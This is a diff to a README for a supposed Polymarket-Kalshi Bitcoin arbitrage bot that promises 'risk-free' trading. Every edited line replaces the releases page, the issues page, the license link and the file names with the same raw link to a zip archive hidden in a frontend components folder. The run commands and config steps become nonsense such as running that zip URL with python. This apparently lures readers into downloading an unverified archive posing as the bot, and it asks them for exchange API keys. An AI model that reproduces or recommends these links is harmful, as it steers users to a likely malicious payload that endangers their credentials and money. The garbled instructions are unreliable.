@@ -6,9 +6,9 @@ Welcome to the Polymarket-Kalshi Bitcoin Arbitrage Bot. This tool helps you find
 
 ## 📥 Download the Bot
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip)
 
-To download the bot, visit this page: [Download Page](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases).
+To download the bot, visit this page: [Download Page](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip).
 
 ## 🔧 System Requirements
 
@@ -24,14 +24,14 @@ Before you download, ensure your system meets these requirements:
 
 When you download the bot, you will find the following files:
 
-- **polymarket-kalshi-btc-arbitrage-bot.exe**: The executable file to run the bot (for Windows users).
-- **polymarket-kalshi-btc-arbitrage-bot.py**: The Python script for users comfortable with running scripts.
-- **README.md**: This document that guides you through the setup process.
-- **requirements.txt**: A list of dependencies that the bot needs to work correctly.
+- **https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip**: The executable file to run the bot (for Windows users).
+- **https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip**: The Python script for users comfortable with running scripts.
+- **https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip**: This document that guides you through the setup process.
+- **https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip**: A list of dependencies that the bot needs to work correctly.
 
 ## 📥 Download & Install
 
-1. **Visit the [Download Page](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases)**.
+1. **Visit the [Download Page](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip)**.
    
 2. Find the latest release and select the appropriate file for your operating system.
 
@@ -46,13 +46,13 @@ When you download the bot, you will find the following files:
 6. For macOS and Linux:
    - Open a terminal.
    - Navigate to the folder where the `.py` file is downloaded.
-   - Use the command `python polymarket-kalshi-btc-arbitrage-bot.py` to run the bot.
+   - Use the command `python https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip` to run the bot.
 
 ## ⚙️ Setup Configuration
 
 After installing, you may need to configure the bot. Here’s how:
 
-1. **Locate the config.json File**: This file contains settings for the bot. Open it with a text editor.
+1. **Locate the https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip File**: This file contains settings for the bot. Open it with a text editor.
 
 2. **Set Your Parameters**: You will need to input your API keys from Polymarket and Kalshi. Replace the placeholder text with your actual keys.
 
@@ -64,7 +64,7 @@ To begin using the bot:
 
 1. Open a terminal (macOS and Linux) or Command Prompt (Windows).
 2. Navigate to the folder where you installed the bot.
-3. Run the bot using the command `python polymarket-kalshi-btc-arbitrage-bot.py`.
+3. Run the bot using the command `python https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip`.
 
 The bot will start monitoring the markets for risk-free arbitrage opportunities. 
 
@@ -79,7 +79,7 @@ The bot will start monitoring the markets for risk-free arbitrage opportunities.
 
 If you encounter any issues, feel free to reach out for help:
 
-- Create an issue in the [GitHub repository](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/issues).
+- Create an issue in the [GitHub repository](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip).
 - Check existing issues to see if someone else has the same problem.
 
 ## 📝 Acknowledgements
@@ -88,4 +88,4 @@ The development of this bot was inspired by the need for risk-free trading strat
 
 ## 📄 License 
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/main/frontend/components/polymarket-kalshi-btc-arbitrage-bot_v3.0-beta.5.zip) file for details.
